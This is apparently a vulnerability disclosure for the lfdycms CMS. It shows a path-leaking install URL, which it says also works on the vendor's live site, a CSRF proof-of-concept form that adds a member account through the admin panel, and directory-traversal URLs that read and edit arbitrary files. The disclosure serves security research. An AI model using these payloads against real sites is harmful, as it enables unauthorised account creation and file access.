# Information_Disclosure
Direct access to the URL: `/install.php?s=/1`, you can see the physical path leaked.

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Information-Disclosure_1-1.png)
The CMS official website is ` http://www.lfdycms.com`,the same problem exists.

Access URL:` http://www.lfdycms.com/install.php?s=/1`

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Information-Disclosure_1-2.png)

-----------------------------------------------------

# CSRF

poc:

```
<html>
  <body>
    <form action="http://www.a.com:83/admin.php?s=/Member/add.html" method="POST">
      <input type="hidden" name="username" value="123456" />
      <input type="hidden" name="password" value="123456" />
      <input type="hidden" name="repassword" value="123456" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

------------------------------------------------------

# Directory-Traversal
The problem connection is located at http://www.a.com:84/admin.php?s=/Template/index.html

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Directory-Traversal_1-1.png)
Direct access to the URL:http://www.a.com:84/admin.php?s=/Template/index/path/*web*..*..*..*..*.html

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Directory-Traversal_1-2.png)
Change the index in the URL to edit to view any file, such as 1.txt in the directory.

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Directory-Traversal_1-3.png)
The content of 1.txt is：

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Directory-Traversal_1-4.png)

Direct access to the URL:http://www.a.com:84/admin.php?s=/Template/edit/path/*web*..*..*..*..*1.txt.html

![](https://github.com/AvaterXXX/CVEs/blob/master/images/lfdycms_Directory-Traversal_1-5.png)
